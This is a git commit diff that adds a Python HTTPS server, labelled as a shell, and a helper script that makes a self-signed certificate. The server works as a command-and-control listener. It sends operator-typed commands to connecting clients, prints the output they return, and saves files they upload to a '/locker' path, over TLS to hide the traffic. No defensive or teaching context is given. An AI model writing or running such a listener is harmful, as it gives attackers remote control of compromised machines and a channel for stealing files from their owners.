78a9520ce0c782f8adf9c9b60aa5819da7aa1a0a
dggsoares <dggsoares@gmail.com>
2019-04-10 23:02:05 -0300

    Project Initiation...

---
+++ https_server.py
@@ -0,0 +1,59 @@
+#!/usr/bin/python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+import time
+import os, cgi
+
+HOST_NAME = '0.0.0.0'
+PORT_NUMBER = 4433
+
+
+class Server(BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        command = input(f"[#] Shell {self.client_address[0]} > ")
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(command.encode())
+
+    def do_POST(self):
+        if self.path == '/locker':
+            try:
+                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
+                if ctype == 'multipart/form-data':
+                    fs = cgi.FieldStorage(fp=self.rfile,
+                                          headers=self.headers,
+                                          environ={'REQUEST_METHOD': 'POST'}
+                                          )
+                else:
+                    print("[X] Unexpected POST request")
+
+                fs_upload = fs['file']
+
+                with open('/root/Desktop/1.txt', 'wb') as o:
+                    o.write(fs_upload.file.read())
+                    self.send_response(200)
+                    self.end_headers()
+            except Exception as e:
+                print(e)
+
+            return
+
+        self.send_response(200)
+        self.end_headers()
+        length = int(self.headers['Content-Length'])
+        command_output = self.rfile.read(length).decode()
+        print(command_output)
+
+
+if __name__ == '__main__':
+    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), Server)
+    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='selfsigned.pem', keyfile='private.pem')
+
+    try:
+        print(f'[+] {time.asctime()} Server is RUNNING! - {HOST_NAME}:{PORT_NUMBER}')
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        httpd.server_close()
+        print(f'[x] {time.asctime()} Server is DOWN! - {HOST_NAME}:{PORT_NUMBER}')
---
+++ self_signed_cert.py
@@ -0,0 +1,45 @@
+from datetime import datetime, timedelta
+from cryptography import x509
+from cryptography.hazmat.primitives import hashes
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+CERT_FILE = "selfsigned.pem"
+KEY_FILE = "private.pem"
+
+
+def create_self_signed_cert():
+    key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=4096,
+        backend=default_backend()
+    )
+
+    # create a self-signed cert
+    name = x509.Name([
+        x509.NameAttribute(NameOID.COMMON_NAME, 'localhost')
+    ])
+    now = datetime.utcnow()
+    cert = (
+        x509.CertificateBuilder()
+            .subject_name(name)
+            .issuer_name(name)
+            .serial_number(1000)
+            .not_valid_before(now)
+            .not_valid_after(now + timedelta(days=10 * 365))
+            .public_key(key.public_key())
+            .sign(key, hashes.SHA256(), default_backend())
+    )
+
+    with open(CERT_FILE, "wb") as output_cert:
+        output_cert.write(cert.public_bytes(encoding=serialization.Encoding.PEM))
+    with  open(KEY_FILE, "wb") as output_key:
+        output_key.write(key.private_bytes(encoding=serialization.Encoding.PEM,
+                                           format=serialization.PrivateFormat.TraditionalOpenSSL,
+                                           encryption_algorithm=serialization.NoEncryption())
+                         )
+
+
+create_self_signed_cert()
